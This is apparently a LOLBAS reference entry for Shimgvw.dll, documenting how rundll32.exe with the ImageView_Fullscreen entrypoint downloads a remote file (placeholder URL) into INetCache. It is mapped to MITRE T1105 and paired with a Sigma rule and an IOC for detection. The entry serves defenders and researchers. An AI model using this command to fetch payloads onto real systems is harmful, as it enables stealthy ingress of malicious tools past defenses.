---
Acknowledgement:
- Person: Era
Author: Eral4m
Commands:
- Category: Download
  Command: rundll32.exe c:\Windows\System32\shimgvw.dll,ImageView_Fullscreen {REMOTEURL:.exe}
  Description: Once executed, rundll32.exe will download the file at the URL in the
    command to INetCache. Can also be used with entrypoint 'ImageView_FullscreenA'.
  MitreID: T1105
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Download: INetCache
  Usecase: Download file from remote location.
Created: 2021-01-06
Description: Photo Gallery Viewer
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml
- IOC: Execution of rundll32.exe with 'ImageView_Fullscreen' and a protocol handler
    ('://') on the command line
Full_Path:
- Path: c:\windows\system32\shimgvw.dll
- Path: c:\windows\syswow64\shimgvw.dll
Name: Shimgvw.dll
Resources:
- Link: https://twitter.com/eral4m/status/1479080793003671557
mitre_data:
  technique_ids:
  - T1105
tags:
- lolbas/oslibraries
---

# Shimgvw.dll

Photo Gallery Viewer

# Path(s)

- `c:\windows\system32\shimgvw.dll`
- `c:\windows\syswow64\shimgvw.dll`

# Download Commands

Once executed, rundll32.exe will download the file at the URL in the command to INetCache. Can also be used with entrypoint 'ImageView_FullscreenA'.

```batch
rundll32.exe c:\Windows\System32\shimgvw.dll,ImageView_Fullscreen {REMOTEURL:.exe}
```

- **Usecase:** Download file from remote location.
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows 10, Windows 11



# Resource(s)

- https://twitter.com/eral4m/status/1479080793003671557
# Acknowledgements

- Eral4m (Authored, 2021-01-06)
- Era